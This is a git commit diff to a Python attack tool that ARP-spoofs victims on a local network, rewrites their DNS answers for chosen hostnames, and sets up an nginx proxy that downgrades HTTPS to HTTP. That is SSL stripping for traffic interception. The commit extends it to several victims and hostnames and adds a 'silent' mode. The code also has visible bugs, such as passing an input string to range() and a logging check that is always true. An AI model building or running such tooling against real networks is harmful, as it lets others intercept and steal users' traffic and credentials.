7b192d8a088c5a65478666401f5e76e6c1ec65c8
Victor Klomp <victor.klomp@gmail.com>
2024-06-10 15:00:18 +0200

    Added some finalizing features

--- main.py
+++ main.py
@@ -9,11 +9,38 @@ import os
 
 def getselfip(hwinterface):
     return get_if_addr(hwinterface)
+    
 
 if __name__ == "__main__":
     hardwareInterface = input("What is the hardware interface you want this to run on?: ")
-    targetIp = input("What is the ip adddress of the victim?: ")
-    hostname = input("What is the hostname that you want to strip?: ")
+
+    numvictims = input("How many victims do you want?: ")
+    if not numvictims.isdigit():
+        print("Received not a number, will assume one victim")
+        numvictims = 1
+    
+    targetIps = []
+    for i in range(numvictims):
+        targetIp = input(f"What is the ip adddress of the victim {i}?: ")
+        targetIps.append(targetIp)
+
+
+    numhostnames = input("How many hostnames do you want to strip?: ")
+    if not numhostnames.isdigit():
+        print("Received not a number, will assume one hostname")
+        numhostnames = 1
+
+    hostnames = []
+    for i in range(numhostnames):
+        hostname = input(f"What is hostname {i} that you want to strip?: ")
+        hostnames.append(hostname)
+
+
+    logging = input("Would you like a full out or silent opertional mode (logging)? [F/S]: ")
+    if logging != "F" or logging != "S":
+        print("Invalid option, will assume silent mode")
+        logging = "S"
+        
 
     # Enable ip forwarding
     os.system("sysctl -w net.ipv4.ip_forward=1")
@@ -22,21 +49,30 @@ if __name__ == "__main__":
 
     gatewayIp = conf.route.route("0.0.0.0")[2]
 
-    print("Starting spoofing")
-    spoofing = threading.Thread(target=startspoofing, args=(targetIp, gatewayIp, hardwareInterface))
-    spoofing.start()
-    
+    print("Starting ARP spoofing...")
+    for i in range(numvictims):
+        spoofing = threading.Thread(target=startspoofing, args=(targetIps[i], gatewayIp, hardwareInterface))
+        spoofing.start()
+    print("Successfully started ARP spoofing.")
 
 
     dictionary = {
-        (f"{hostname}.").encode('UTF-8'): ownip,
+        # (f"{hostname}.").encode('UTF-8'): ownip,
     }
 
-    print("Starting DNS altering")
-    dnsaltering = threading.Thread(target=startDNSaltering, args=(dictionary, targetIp))
-    dnsaltering.start()
+    for i in range(numhostnames):
+        dictionary[(f"{hostnames[i]}.").encode('UTF-8')] = ownip
 
-    setnginxconfig(hostname, "/etc/nginx/sites-available/default")
+
+    print("Starting DNS altering...")
+    for i in range(numvictims):
+        dnsaltering = threading.Thread(target=startDNSaltering, args=(dictionary, targetIps[i]))
+        dnsaltering.start()
+    print("Successfully started DNS altering.")
+
+    for i in range(numhostnames):
+        setnginxconfig(hostname)
+    print("Successfully set Nginx config")
 
 
 
--- nginx.py
+++ nginx.py
@@ -1,19 +1,30 @@
 import os
 import logging as log
 
-# setconfigfile("estctwist.nl", "/etc/nginx/sites-enabled/default.conf")
-def setnginxconfig(website, path):
-    f = open(path, "w")
+# setconfigfile("estctwist.nl")
+def setnginxconfig(website):
+    f = open(f"/etc/nginx/sites-available/{website}.conf", "w")
     f.write(f"""
 server {{
     listen 80 default_server;
     listen [::]:80 default_server;
-    root /var/www/html;
-    server_name _;
+    server_name {website};
     location / {{
         proxy_pass https://{website};
     }}
 }}
+
+# Redirect HTTPS to HTTP
+server {{
+        listen 443 default_server;
+        listen [::]:443 default_server;
+        server_name _;
+
+        location / {{
+                return 301 http://$host$request_uri;
+        }}
+}}
 """)
     f.close()
+    os.system(f"sudo ln /etc/nginx/sites-available/{website}.conf /etc/nginx/sites-enabled/{website}.conf")
     os.system("sudo service nginx restart")
